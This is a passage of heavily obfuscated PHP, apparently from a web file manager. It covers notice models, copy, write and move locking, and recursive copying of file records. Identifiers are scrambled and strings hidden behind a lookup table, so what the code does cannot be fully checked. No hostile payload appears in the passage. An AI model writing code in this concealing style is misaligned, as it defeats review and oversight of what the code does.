$êáñ×¦·[$—íË›ÆÉ - 1][$Ë°¹¶«[200]]) < 5) { continue; } $á‡ø÷ÉÛ = json_decode($¹¯ëŠÖ‚[$Ë°¹¶«[461]], !0); $¹¯ëŠÖ‚[$Ë°¹¶«[2254]] = isset($á‡ø÷ÉÛ[$Ë°¹¶«[2254]]) ? $á‡ø÷ÉÛ[$Ë°¹¶«[2254]] : $Ë°¹¶«[12]; unset($á‡ø÷ÉÛ[$Ë°¹¶«[2254]]); $¬—Óï› = $this->deviceType($á‡ø÷ÉÛ[$Ë°¹¶«[2063]]); if (isset($Î«£ò®[$¬—Óï›])) { continue; } $¹¯ëŠÖ‚[$Ë°¹¶«[2258]] = IpLocation::get($¹¯ëŠÖ‚[$Ë°¹¶«[2254]]); $¹¯ëŠÖ‚[$Ë°¹¶«[461]] = $á‡ø÷ÉÛ; $Î«£ò®[$¬—Óï›] = $¹¯ëŠÖ‚; } return array_values($Î«£ò®); } public function deviceType($£ªê×á×) { return $£ªê×á×; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x6e\157\x74\151\x63\x65\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\143\157\x6e\164\x65\156\164", "\141\x75\x74\x68", "\155\157\144\x65", "\164\x69\155\x65", "\164\171\x70\x65", "\x6c\145\166\145\154", "\145\x6e\x61\x62\154\x65", "\x73\157\162\x74"); public function listData($­òµ½€› = false, $¿Ş‡ä©  = "\163\x6f\x72\164", $§×ğÆ–’ = false) { return parent::listData($­òµ½€›, $¿Ş‡ä© , $§×ğÆ–’); } public function add($ò•Ö…–‘) { $²Óô³º¹ =& $_SERVER[™¾ÇÙ¯¹]; $„£‡ğÚç = time(); if ($ò•Ö…–‘[$²Óô³º¹[16]] == $²Óô³º¹[2265]) { $„£‡ğÚç = strtotime($ò•Ö…–‘[$²Óô³º¹[203]]); } $ò•Ö…–‘[$²Óô³º¹[203]] = $„£‡ğÚç; return parent::insert($ò•Ö…–‘); } public function update($î¨†¾½¸, $ÁŞÄ°§) { $š§šö =& $_SERVER[™¾ÇÙ¯¹]; $åÑöŒ§“ = $this->listData($î¨†¾½¸); if (!$åÑöŒ§“) { return !1; } $ò§í±Ó = time(); if ($ÁŞÄ°§[$š§šö[16]] == $š§šö[2265]) { $ò§í±Ó = strtotime($ÁŞÄ°§[$š§šö[203]]); } $ÁŞÄ°§[$š§šö[203]] = $ò§í±Ó; return parent::update($î¨†¾½¸, $ÁŞÄ°§); } public function remove($İ‚Éá‹ç) { $’³¢û³Œ = $this->listData($İ‚Éá‹ç); if (!$’³¢û³Œ || $’³¢û³Œ[$_SERVER[™¾ÇÙ¯¹][1284]]) { return !1; } return parent::remove($İ‚Éá‹ç); } public function sort($Æ¿¢¼¡œ, $ôòÕö·) { return parent::update($Æ¿¢¼¡œ, $ôòÕö·); } public function enable($Üµùéâ¸, $ÁÁøÔ×°) { return parent::update($Üµùéâ¸, array($_SERVER[™¾ÇÙ¯¹][2266] => $ÁÁøÔ×°)); } private function initUserOption() { $òÄ×¨Àê =& $_SERVER[™¾ÇÙ¯¹]; $this->optionType = $òÄ×¨Àê[2267]; $this->modelType = $òÄ×¨Àê[2268]; $this->field = array($òÄ×¨Àê[2269], $òÄ×¨Àê[32], $òÄ×¨Àê[203], $òÄ×¨Àê[33], $òÄ×¨Àê[2270], $òÄ×¨Àê[765], $òÄ×¨Àê[195]); } public function userNoticeGet($æô›¸é = false) { $this->initUserOption(); return parent::listData($æô›¸é, $_SERVER[™¾ÇÙ¯¹][407], !0); } public function userNoticeAdd($­©àø§) { $¨øÊèÜ =& $_SERVER[™¾ÇÙ¯¹]; $this->initUserOption(); $Ò¤Úäóí = $this->findByKey($¨øÊèÜ[2269], $­©àø§[$¨øÊèÜ[407]]); if ($Ò¤Úäóí) { return !0; } $Ñ²¼ÑÖ£ = array($¨øÊèÜ[2269] => $­©àø§[$¨øÊèÜ[407]], $¨øÊèÜ[32] => $­©àø§[$¨øÊèÜ[32]], $¨øÊèÜ[203] => $­©àø§[$¨øÊèÜ[203]], $¨øÊèÜ[33] => isset($­©àø§[$¨øÊèÜ[33]]) ? $­©àø§[$¨øÊèÜ[33]] : 1, $¨øÊèÜ[2270] => isset($­©àø§[$¨øÊèÜ[2270]]) ? $­©àø§[$¨øÊèÜ[2270]] : 0, $¨øÊèÜ[765] => 0, $¨øÊèÜ[195] => 0); return parent::insert($Ñ²¼ÑÖ£); } public function userNoticeEdit($¼¹í˜ı©, $Ó†Å’÷‡) { $this->initUserOption(); return parent::update($¼¹í˜ı©, $Ó†Å’÷‡); } } goto c˜çµŸÒ»×; b‰»µÅ‰‘: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Èñİèîò) { $Ù—úÜ‚Ò =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ù—úÜ‚Ò[563], $Èñİèîò); $Š®èóùç = 1; $this->_lockEvent($Èñİèîò, array($Ù—úÜ‚Ò[564], $Ù—úÜ‚Ò[565]), $Š®èóùç); $this->_lockParent($Èñİèîò, array($Ù—úÜ‚Ò[565]), $Š®èóùç); $this->_lockEvent($Èñİèîò, array($Ù—úÜ‚Ò[566], $Ù—úÜ‚Ò[567]), $Š®èóùç); $this->_lockCheckEnd($Ù—úÜ‚Ò[563], $Èñİèîò); } public function lockCopyEnd($Ñ´Ìî…) { $üÉ±Úé‚ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->allowLock()) { return; } $²‚¥üæó = 0; $this->_lockEvent($Ñ´Ìî…, array($üÉ±Úé‚[564], $üÉ±Úé‚[565]), $²‚¥üæó); $this->_lockParent($Ñ´Ìî…, array($üÉ±Úé‚[565]), $²‚¥üæó); $this->_lockEvent($Ñ´Ìî…, array($üÉ±Úé‚[566], $üÉ±Úé‚[567]), $²‚¥üæó); } public function lockWriteStart($·ÕÅóÌ, $ƒÏÕİˆ² = '') { $ÉÔÜâî¶ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÉÔÜâî¶[564], $·ÕÅóÌ); $Ÿû¡óä = 1; $this->_lockKey($ÉÔÜâî¶[568] . $·ÕÅóÌ . $ÉÔÜâî¶[10] . $ƒÏÕİˆ², $Ÿû¡óä); $this->_lockEvent($·ÕÅóÌ, array($ÉÔÜâî¶[563], $ÉÔÜâî¶[565]), $Ÿû¡óä); $this->_lockParent($·ÕÅóÌ, array($ÉÔÜâî¶[563], $ÉÔÜâî¶[565]), $Ÿû¡óä); $this->_lockCheckEnd($ÉÔÜâî¶[564], $·ÕÅóÌ); } public function lockWriteEnd($…¡«ñÊ—, $±åïíÃæ = '') { $‰ÆÙ“”ì =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->allowLock()) { return; } $ÏÅœÊƒ = 0; $this->_lockKey($‰ÆÙ“”ì[568] . $…¡«ñÊ— . $‰ÆÙ“”ì[10] . $±åïíÃæ, $ÏÅœÊƒ); $this->_lockEvent($…¡«ñÊ—, array($‰ÆÙ“”ì[563], $‰ÆÙ“”ì[565]), $ÏÅœÊƒ); $this->_lockParent($…¡«ñÊ—, array($‰ÆÙ“”ì[563], $‰ÆÙ“”ì[565]), $ÏÅœÊƒ); } public function lockMoveStart($ßïéÕ) { $â€ëÔÇï =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->allowLock()) { return; } $this->_lockCheck($â€ëÔÇï[565], $ßïéÕ); $ó½ÖœŒˆ = 1; $this->_lockKey($â€ëÔÇï[569] . $ßïéÕ, $ó½ÖœŒˆ); $this->_lockEvent($ßïéÕ, array($â€ëÔÇï[563], $â€ëÔÇï[564]), $ó½ÖœŒˆ); $this->_lockParent($ßïéÕ, array($â€ëÔÇï[563], $â€ëÔÇï[565]), $ó½ÖœŒˆ); $this->_lockEvent($ßïéÕ, array($â€ëÔÇï[570], $â€ëÔÇï[566], $â€ëÔÇï[567]), $ó½ÖœŒˆ); $this->_lockCheckEnd($â€ëÔÇï[565], $ßïéÕ); } public function lockMoveEnd($‹²ø¯ÔĞ) { $–¹²ğ¶í =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->allowLock()) { return; } $½àûá = 0; $this->_lockKey($–¹²ğ¶í[569] . $‹²ø¯ÔĞ, $½àûá); $this->_lockEvent($‹²ø¯ÔĞ, array($–¹²ğ¶í[563], $–¹²ğ¶í[564]), $½àûá); $this->_lockParent($‹²ø¯ÔĞ, array($–¹²ğ¶í[563], $–¹²ğ¶í[565]), $½àûá); $this->_lockEvent($‹²ø¯ÔĞ, array($–¹²ğ¶í[570], $–¹²ğ¶í[566], $–¹²ğ¶í[567]), $½àûá); } private function _lockCheck($Ëœù¹«, $ßĞÎåéÀ) { $÷³‡ÎÈ =& $_SERVER[™¾ÇÙ¯¹]; $ÁŒßææƒ = $this->sourceInfo($ßĞÎåéÀ); $š° ‡•õ = $Ëœù¹« . $÷³‡ÎÈ[10] . $ßĞÎåéÀ; $this->_lockTimeStart[$š° ‡•õ] = timeFloat(); if (!is_array($ÁŒßææƒ)) { return; } $ÏÖ˜ˆ… = LNG($÷³‡ÎÈ[571]); CacheLock::setErrorMsg($÷³‡ÎÈ[162] . htmlspecialchars($ÁŒßææƒ[$÷³‡ÎÈ[32]]) . $÷³‡ÎÈ[164] . $ÏÖ˜ˆ…); $this->_lockKey($š° ‡•õ, 1); $this->_lockKey($š° ‡•õ, 0); $íøê¨Úñ = array_reverse($this->parentLevelArray($ÁŒßææƒ[$÷³‡ÎÈ[529]])); foreach ($íøê¨Úñ as $¶Ä€ùÊ) { $š° ‡•õ = $Ëœù¹« . $÷³‡ÎÈ[572] . $¶Ä€ùÊ; if (CacheLock::lockGet($÷³‡ÎÈ[573] . $š° ‡•õ)) { $ÁŒßææƒ = $this->sourceInfo($¶Ä€ùÊ); CacheLock::setErrorMsg($÷³‡ÎÈ[162] . htmlspecialchars($ÁŒßææƒ[$÷³‡ÎÈ[32]]) . $÷³‡ÎÈ[164] . $ÏÖ˜ˆ…); $this->_lockKey($š° ‡•õ, 1); $this->_lockKey($š° ‡•õ, 0); } } } private function _lockCheckEnd($–ÄèßŒå, $à‡àù´) { $üÓÏéªÈ =& $_SERVER[™¾ÇÙ¯¹]; $†Ìßª¯ = $–ÄèßŒå . $üÓÏéªÈ[10] . $à‡àù´; CacheLock::setErrorMsg($üÓÏéªÈ[252]); if (!isset($this->_lockTimeStart[$†Ìßª¯])) { return; } $®òäÈÊÜ = timeFloat() - $this->_lockTimeStart[$†Ìßª¯]; unset($this->_lockTimeStart[$†Ìßª¯]); if ($®òäÈÊÜ > 0.5) { unset(self::$cacheSourceInfo[$üÓÏéªÈ[468] . $à‡àù´]); } $„ µßÍç = $this->sourceInfo($à‡àù´); if (!$„ µßÍç) { show_json(LNG($üÓÏéªÈ[105]), !1); } } private function _lockParent($¤ÊÉ•ûÇ, $æ’ş¡ÇÓ, $ç²•Êá´) { if (!$this->autoLockSet) { return; } $š®°„“‚ = $this->sourceInfo($¤ÊÉ•ûÇ); if (!is_array($š®°„“‚)) { return; } $üá¥›œ¯ = array_reverse($this->parentLevelArray($š®°„“‚[$_SERVER[™¾ÇÙ¯¹][529]])); foreach ($üá¥›œ¯ as $öÕ‚Öî¶) { $this->_lockEvent($öÕ‚Öî¶, $æ’ş¡ÇÓ, $ç²•Êá´); } } private function _lockEvent($õ€æ€Ç¢, $§ÜÂÕ”é, $Ú×à‘ğÓ) { $û²–˜áù =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->autoLockSet) { return; } foreach ($§ÜÂÕ”é as $Ğªîî°¸) { $Ó÷Ôıæ = $Ğªîî°¸ . $û²–˜áù[10] . $õ€æ€Ç¢; if ($Ú×à‘ğÓ && CacheLock::lockGet($û²–˜áù[573] . $Ó÷Ôıæ)) { continue; } $this->_lockKey($Ó÷Ôıæ, $Ú×à‘ğÓ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($†ÚõÚÁƒ, $€ÜµŠœØ = 1) { $Ã†÷ä™” = $_SERVER[™¾ÇÙ¯¹][573] . md5($†ÚõÚÁƒ); if ($€ÜµŠœØ) { if (isset(self::$_lockItemArr[$Ã†÷ä™”])) { return; } self::$_lockItemArr[$Ã†÷ä™”] = 1; CacheLock::lock($Ã†÷ä™”, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ã†÷ä™”])) { return; } unset(self::$_lockItemArr[$Ã†÷ä™”]); CacheLock::unlock($Ã†÷ä™”); } } public function isParentOf($²«Ü½­, $Úù›¤­ï) { $¹Îã÷ =& $_SERVER[™¾ÇÙ¯¹]; $¨Ï¥“·Ã = $this->sourceInfo($²«Ü½­); $³­Ï¤Û³ = $this->sourceInfo($Úù›¤­ï); $®„ÄŞĞş = $¨Ï¥“·Ã[$¹Îã÷[529]] . $¨Ï¥“·Ã[$¹Îã÷[410]] . $¹Îã÷[50]; $œ¹Äè = $³­Ï¤Û³[$¹Îã÷[529]] . $³­Ï¤Û³[$¹Îã÷[410]] . $¹Îã÷[50]; $¤É¨¯Ñ£ = strpos($œ¹Äè, $®„ÄŞĞş) === 0; return $¤É¨¯Ñ£; } private $targetIsDelete = 0; public function copy($•±Ş¦ÌÈ, $‹ÕÅ ¢İ, $ÅÓÓ†Õ” = REPEAT_REPLACE, $õ¶‡ÍÏË = '') { $İáé˜²ü =& $_SERVER[™¾ÇÙ¯¹]; $—ŞŠ³Ÿ = $this->sourceInfo($•±Ş¦ÌÈ); $ÑÃ« ¦ä = $this->sourceInfo($‹ÕÅ ¢İ); if (!$—ŞŠ³Ÿ || !$ÑÃ« ¦ä || $ÑÃ« ¦ä[$İáé˜²ü[418]] != $İáé˜²ü[88]) { return !1; } if ($this->isParentOf($•±Ş¦ÌÈ, $‹ÕÅ ¢İ)) { return !1; } $›‰íŒÁä = $õ¶‡ÍÏË ? $õ¶‡ÍÏË : $—ŞŠ³Ÿ[$İáé˜²ü[32]]; $this->lockCopyStart($•±Ş¦ÌÈ); $this->lockWriteStart($‹ÕÅ ¢İ, $›‰íŒÁä); $¬Ñğ¡ó = array($İáé˜²ü[574] => array(), $İáé˜²ü[575] => array(), $İáé˜²ü[576] => array()); $this->targetIsDelete = intval($—ŞŠ³Ÿ[$İáé˜²ü[439]]); $¥“é—·Ğ = $this->fileNameExistCache($‹ÕÅ ¢İ, $—ŞŠ³Ÿ[$İáé˜²ü[32]]); $ï¤¡¤­ = $this->_copy($•±Ş¦ÌÈ, $‹ÕÅ ¢İ, $ÅÓÓ†Õ”, $¬Ñğ¡ó, !0, $õ¶‡ÍÏË); $this->_childrenListClear(); $this->lockCopyEnd($•±Ş¦ÌÈ); $this->lockWriteEnd($‹ÕÅ ¢İ, $›‰íŒÁä); if ($—ŞŠ³Ÿ[$İáé˜²ü[418]] == $İáé˜²ü[88] && $¥“é—·Ğ == $ï¤¡¤­) { $this->folderSizeResetChildren($¥“é—·Ğ); } Model($İáé˜²ü[577])->addAll($¬Ñğ¡ó[$İáé˜²ü[575]], array(), !0); if ($¥“é—·Ğ != $ï¤¡¤­ || $—ŞŠ³Ÿ[$İáé˜²ü[418]] == $İáé˜²ü[88]) { Model($İáé˜²ü[578])->eventCopy($ï¤¡¤­); } $this->saveAll($¬Ñğ¡ó[$İáé˜²ü[576]]); Model($İáé˜²ü[199])->linkAdd($¬Ñğ¡ó[$İáé˜²ü[574]]); $this->folderSizeReset($‹ÕÅ ¢İ); $this->updateModifyTime($‹ÕÅ ¢İ); return $ï¤¡¤­; } private function _copy($ÊÔ¥¢¿Â, $Øä‘ŒÏ, $²ŸÀÛë­, &$ôÁÒ…—õ, $îú×„¢º, $°¾Íª£Å = '') { $¬ã«¥ëú =& $_SERVER[™¾ÇÙ¯¹]; $ƒ‘É¸óƒ = $this->sourceInfoCache($ÊÔ¥¢¿Â); $Ñšƒôù = $ƒ‘É¸óƒ[$¬ã«¥ëú[418]] == $¬ã«¥ëú[88]; $ĞÒş«¦ = $°¾Íª£Å ? $°¾Íª£Å : $ƒ‘É¸óƒ[$¬ã«¥ëú[32]]; $ÓÁ‰û¨ = $this->fileNameExistCache($Øä‘ŒÏ, $ĞÒş«¦); if ($îú×„¢º) { $this->_childrenAllMake($ÊÔ¥¢¿Â); if ($Ñšƒôù && $ÓÁ‰û¨) { $this->_childrenAllMake($ÓÁ‰û¨); } } if (!$ÓÁ‰û¨) { return $this->_copyCreate($ÊÔ¥¢¿Â, $Øä‘ŒÏ, $ĞÒş«¦, $ôÁÒ…—õ); } $”Ÿ°¸éŞ = $ÓÁ‰û¨; if ($Ñšƒôù) { if ($²ŸÀÛë­ == REPEAT_RENAME_FOLDER) { $ĞÒş«¦ = $this->fileNameAutoCache($Øä‘ŒÏ, $ĞÒş«¦, $²ŸÀÛë­, $Ñšƒôù); $”Ÿ°¸éŞ = $this->_copyCreate($ÊÔ¥¢¿Â, $Øä‘ŒÏ, $ĞÒş«¦, $ôÁÒ…—õ); } else { $äæÁîş¯ = $this->_childrenList($ÊÔ¥¢¿Â); foreach ($äæÁîş¯ as $ÁÚçµÆ) { $this->_copy($ÁÚçµÆ[$¬ã«¥ëú[410]], $ÓÁ‰û¨, $²ŸÀÛë­, $ôÁÒ…—õ, !1); } } } else { if ($²ŸÀÛë­ == REPEAT_RENAME || $²ŸÀÛë­ == REPEAT_RENAME_FOLDER) { $ĞÒş«¦ = $this->fileNameAutoCache($Øä‘ŒÏ, $ĞÒş«¦, $²ŸÀÛë­, $Ñšƒôù); $”Ÿ°¸éŞ = $this->_copyCreate($ÊÔ¥¢¿Â, $Øä‘ŒÏ, $ĞÒş«¦, $ôÁÒ…—õ); } else { if ($²ŸÀÛë­ == REPEAT_REPLACE) { $È¬»¦·Í = $this->sourceInfoCache($ÓÁ‰û¨); $ªƒ±¹¤‹ = $this->fileHistory($È¬»¦·Í, $ƒ‘É¸óƒ[$¬ã«¥ëú[476]], $ƒ‘É¸óƒ[$¬ã«¥ëú[76]]); if ($ªƒ±¹¤‹) { $ôÁÒ…—õ[$¬ã«¥ëú[574]][] = $ƒ‘É¸óƒ[$¬ã«¥ëú[476]]; } } else { if ($²ŸÀÛë­ == REPEAT_SKIP) { } } } Hook::trigger($¬ã«¥ëú[579], array($¬ã«¥ëú[580], $ƒ‘É¸óƒ, 0)); } return $”Ÿ°¸éŞ; } private function _copyCreate($Œú³×§¨, $êšì‹„Á, $Ä€üèøÖ, &$¿§’¨) { $˜õ”À’Ì =& $_SERVER[™¾ÇÙ¯¹]; $¥Î¤Õ¤š = $this->sourceInfoCache($Œú³×§¨); $§š…ºñˆ = $this->sourceInfoCache($êšì‹„Á); $Ì€ÅŒê… = $this->_makeItemData($¥Î¤Õ¤š, $§š…ºñˆ, $Ä€üèøÖ); Hook::trigger($˜õ”À’Ì[581], $Ì€ÅŒê…); Hook::trigger($˜õ”À’Ì[582], array($˜õ”À’Ì[583], $Ì€ÅŒê…, 0)); $´Çˆù•§ = $this->add($Ì€ÅŒê…); $µïÊ†º¤ = array($˜õ”À’Ì[410] => $´Çˆù•§, $˜õ”À’Ì[32] => $Ä€üèøÖ); $this->_copyApplyMeta($µïÊ†º¤, $¿§’¨); if ($¥Î¤Õ¤š[$˜õ”À’Ì[418]] != $˜õ”À’Ì[88]) { $¿§’¨[$˜õ”À’Ì[574]][] = $¥Î¤Õ¤š[$˜õ”À’Ì[476]]; return $´Çˆù•§; } $™ûè¶‰« = array(); $»–“Ô‘ = array(); $this->_childrenListAll($Œú³×§¨, $™ûè¶‰«); $Ô†¹åŒü = count($™ûè¶‰«); if ($Ô†¹åŒü == 0) { return $´Çˆù•§; } $ÂÉ‰µÑ = $this->sourceInfo($´Çˆù•§); foreach ($™ûè¶‰« as $ŸÙ½Œ ƒ) { $³ê¤Âşú = $this->_makeItemData($ŸÙ½Œ ƒ, $ÂÉ‰µÑ, $ŸÙ½Œ ƒ[$˜õ”À’Ì[32]]); $³ê¤Âşú[$˜õ”À’Ì[529]] = $ŸÙ½Œ ƒ[$˜õ”À’Ì[529]]; $»–“Ô‘[] = $³ê¤Âşú; } $this->chunkEventSet($˜õ”À’Ì[584], array($˜õ”À’Ì[585], $Ì€ÅŒê…, $Ô†¹åŒü)); $this->addAll($»–“Ô‘, array(), !1); $ı¡ËôÄ = $this->where(array($˜õ”À’Ì[440] => $´Çˆù•§))->select(); $«ÆğÏöÉ = $this->_childrenMakeRelation($™ûè¶‰«, $ı¡ËôÄ); $«ÆğÏöÉ[$Œú³×§¨] = $´Çˆù•§; $ùğĞ¨ˆÍ = array(); $åÔÓÊ©¶ = array(); foreach ($ı¡ËôÄ as $ŸÙ½Œ ƒ) { $Àì»“Ä§ = $ŸÙ½Œ ƒ[$˜õ”À’Ì[410]]; $•îÅ˜£¿ = $this->_childrenMatch($«ÆğÏöÉ, $ŸÙ½Œ ƒ, $ÂÉ‰µÑ); $ùğĞ¨ˆÍ[] = array($˜õ”À’Ì[410], $Àì»“Ä§, $˜õ”À’Ì[440], $•îÅ˜£¿[$˜õ”À’Ì[440]]); $åÔÓÊ©¶[] = array($˜õ”À’Ì[410], $Àì»“Ä§, $˜õ”À’Ì[529], $•îÅ˜£¿[$˜õ”À’Ì[529]]); $this->_copyApplyMeta($ŸÙ½Œ ƒ, $¿§’¨); if ($ŸÙ½Œ ƒ[$˜õ”À’Ì[418]] != $˜õ”À’Ì[88]) { $¿§’¨[$˜õ”À’Ì[574]][] = $ŸÙ½Œ ƒ[$˜õ”À’Ì[476]]; } } $this->chunkEventSet($˜õ”À’Ì[586], array($˜õ”À’Ì[587], $Ì€ÅŒê…, $Ô†¹åŒü)); $this->saveAll($ùğĞ¨ˆÍ); $this->chunkEventSet($˜õ”À’Ì[588], array($˜õ”À’Ì[589], $Ì€ÅŒê…, $Ô†¹åŒü)); $this->saveAll($åÔÓÊ©¶); return $´Çˆù•§; } private function _childrenMakeRelation($¿ÜÃæÙ, $øˆĞãõ) { $–Ä£˜ =& $_SERVER[™¾ÇÙ¯¹]; $ğßËåó„ = array(); $Ü©İÓƒ = array(); foreach ($¿ÜÃæÙ as $İŒ•Åª) { $‰Øóˆ¿À = $İŒ•Åª[$–Ä£˜[32]] . $–Ä£˜[8] . $İŒ•Åª[$–Ä£˜[529]]; $ğßËåó„[$‰Øóˆ¿À] = $İŒ•Åª[$–Ä£˜[410]]; } foreach ($øˆĞãõ as $İŒ•Åª) { $‰Øóˆ¿À = $İŒ•Åª[$–Ä£˜[32]] . $–Ä£˜[8] . $İŒ•Åª[$–Ä£˜[529]]; $¨ĞŒ›Ñò = $ğßËåó„[$‰Øóˆ¿À]; $Ü©İÓƒ[$¨ĞŒ›Ñò] = $İŒ•Åª[$–Ä£˜[410]]; } return $Ü©İÓƒ; } private function _childrenMatch($¶’º‹€, $¢ùŸÎğ¼, $ùˆ¿°Ëì) { $ÁÄÌÌ± =& $_SERVER[™¾ÇÙ¯¹]; $ÂîŒ¶è = $ùˆ¿°Ëì[$ÁÄÌÌ±[529]]; $­ğì‰œ = $this->parentLevelArray($¢ùŸÎğ¼[$ÁÄÌÌ±[529]]); foreach ($­ğì‰œ as $”æÂ³áâ) { if (isset($¶’º‹€[$”æÂ³áâ])) { $ÂîŒ¶è .= $¶’º‹€[$”æÂ³áâ] . $ÁÄÌÌ±[590]; } } $ÂîŒ¶è = rtrim($ÂîŒ¶è, $ÁÄÌÌ±[50]) . $ÁÄÌÌ±[50]; $¬³³„´Œ = $this->parentLevelArray($ÂîŒ¶è); $›†úŒñ¿ = $¬³³„´Œ[count($¬³³„´Œ) - 1]; return array($ÁÄÌÌ±[440] => $›†úŒñ¿, $ÁÄÌÌ±[529] => $ÂîŒ¶è); } private function _makeItemData($Ìîµí³, $€ûòšŸ‘, $ ˆ§Œ·µ) { $šÍ”–±Á =& $_SERVER[™¾ÇÙ¯¹]; $ Ù¾¹Œƒ = array($šÍ”–±Á[591] => $Ìîµí³[$šÍ”–±Á[418]], $šÍ”–±Á[428] => $ ˆ§Œ·µ, $šÍ”–±Á[592] => $Ìîµí³[$šÍ”–±Á[420]] ? $Ìîµí³[$šÍ”–±Á[420]] : $šÍ”–±Á[12], $šÍ”–±Á[477] => $Ìîµí³[$šÍ”–±Á[476]] ? $Ìîµí³[$šÍ”–±Á[476]] : 0, $šÍ”–±Á[593] => $Ìîµí³[$šÍ”–±Á[76]] ? $Ìîµí³[$šÍ”–±Á[76]] : 0, $šÍ”–±Á[594] => intval($€ûòšŸ‘[$šÍ”–±Á[419]]), $šÍ”–±Á[595] => intval($€ûòšŸ‘[$šÍ”–±Á[513]]), $šÍ”–±Á[596] => intval(USER_ID), $šÍ”–±Á[597] => intval(USER_ID), $šÍ”–±Á[409] => intval($€ûòšŸ‘[$šÍ”–±Á[410]]), $šÍ”–±Á[598] => $€ûòšŸ‘[$šÍ”–±Á[529]] . $€ûòšŸ‘[$šÍ”–±Á[410]] . $šÍ”–±Á[50], $šÍ”–±Á[432] => $Ìîµí³[$šÍ”–±Á[85]] ? $Ìîµí³[$šÍ”–±Á[85]] : time(), $šÍ”–±Á[438] => 0, $šÍ”–±Á[599] => $šÍ”–±Á[12]); return $ Ù¾¹Œƒ; } private function _copyApplyMeta($”ó½â—€, &$öß²çå) { $‚¦ƒï¬Ÿ =& $_SERVER[™¾ÇÙ¯¹]; $¦áû¥ß = $”ó½â—€[$‚¦ƒï¬Ÿ[410]]; $á¯í§îé = $”ó½â—€[$‚¦ƒï¬Ÿ[32]]; if (!isset($”ó½â—€[$‚¦ƒï¬Ÿ[600]]) || !$”ó½â—€[$‚¦ƒï¬Ÿ[600]] || $”ó½â—€[$‚¦ƒï¬Ÿ[600]] == $‚¦ƒï¬Ÿ[197]) { $öß²çå[$‚¦ƒï¬Ÿ[576]][] = array($‚¦ƒï¬Ÿ[410], $¦áû¥ß, $‚¦ƒï¬Ÿ[600], short_id($¦áû¥ß)); } if (Input::check($á¯í§îé, $‚¦ƒï¬Ÿ[601])) { $öß²çå[$‚¦ƒï¬Ÿ[575]][] = array($‚¦ƒï¬Ÿ[410] => $¦áû¥ß, $‚¦ƒï¬Ÿ[94] => $‚¦ƒï¬Ÿ[473], $‚¦ƒï¬Ÿ[383] => str_replace($‚¦ƒï¬Ÿ[53], $‚¦ƒï¬Ÿ[12], Pinyin::get($á¯í§îé))); $öß²çå[$‚¦ƒï¬Ÿ[575]][] = array($‚¦ƒï¬Ÿ[410] => $¦áû¥ß, $‚¦ƒï¬Ÿ[94] => $‚¦ƒï¬Ÿ[472], $‚¦ƒï¬Ÿ[383] => Pinyin::get($á¯í§îé, $‚¦ƒï¬Ÿ[602])); } $öß²çå[$‚¦ƒï¬Ÿ[575]][] = array($‚¦ƒï¬Ÿ[410] => $¦áû¥ß, $‚¦ƒï¬Ÿ[94] => $‚¦ƒï¬Ÿ[452], $‚¦ƒï¬Ÿ[383] => KodSort::makeStr($á¯í§îé)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($÷ºş·Ÿ€) { $œ¥Ûƒ ‡ =& $_SERVER[™¾ÇÙ¯¹]; $ª“ÑÚé = $this->sourceInfo($÷ºş·Ÿ€); $ÙşçÑ‰¨ = $œ¥Ûƒ ‡[603]; $…›Ù“†Á = array($œ¥Ûƒ ‡[529] => array($œ¥Ûƒ ‡[558], $ª“ÑÚé[$œ¥Ûƒ ‡[529]] . $÷ºş·Ÿ€ . $œ¥Ûƒ ‡[559]), $œ¥Ûƒ ‡[439] => $this->targetIsDelete); $ÉÒãÈñİ = $this->field($ÙşçÑ‰¨)->where($…›Ù“†Á)->select(); if (!$ÉÒãÈñİ) { return; } $ÉÒãÈñİ = array_to_keyvalue($ÉÒãÈñİ, $œ¥Ûƒ ‡[410]); foreach ($ÉÒãÈñİ as $ãâ—™ÍÒ) { $òÄ“ÄÑş = $ãâ—™ÍÒ[$œ¥Ûƒ ‡[440]]; $÷ºş·Ÿ€ = $ãâ—™ÍÒ[$œ¥Ûƒ ‡[410]]; if (!isset($this->_childrenListCache[$÷ºş·Ÿ€]) && $ãâ—™ÍÒ[$œ¥Ûƒ ‡[418]] == $œ¥Ûƒ ‡[88]) { $this->_childrenListCache[$÷ºş·Ÿ€] = array(); } if (!isset($this->_childrenListCache[$òÄ“ÄÑş])) { $this->_childrenListCache[$òÄ“ÄÑş] = array(); } $this->_childrenListCache[$òÄ“ÄÑş][$÷ºş·Ÿ€] = $ãâ—™ÍÒ; $this->_childrenItemCache[$÷ºş·Ÿ€] = $ãâ—™ÍÒ; } } private function _childrenListAll($ˆÚ®‚öÃ, &$˜’ÚÈ¶) { $£ç®Îöá =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($this->_childrenListCache[$ˆÚ®‚öÃ])) { return; } $şçÆÍ¾› = $this->_childrenListCache[$ˆÚ®‚öÃ]; foreach ($şçÆÍ¾› as $ƒ¨¡·€ï => $ªÂÅü•–) { $˜’ÚÈ¶[$ƒ¨¡·€ï] = $ªÂÅü•–; if ($ªÂÅü•–[$£ç®Îöá[418]] == $£ç®Îöá[88]) { $this->_childrenListAll($ƒ¨¡·€ï, $˜’ÚÈ¶); } } } private function sourceInfoCache($ş…Âˆ ») { if (isset($this->_childrenItemCache[$ş…Âˆ »])) { return $this->_childrenItemCache[$ş…Âˆ »]; } return $this->sourceInfo($ş…Âˆ »); } private function _childrenList($‘Áú±ñ) { if (isset($this->_childrenListCache[$‘Áú±ñ])) { return $this->_childrenListCache[$‘Áú±ñ]; } return $this->_childrenListSelect($‘Áú±ñ); } private function _childrenListSelect($¡æÓ²§‰) { $ÀÄº¤Óí =& $_SERVER[™¾ÇÙ¯¹]; 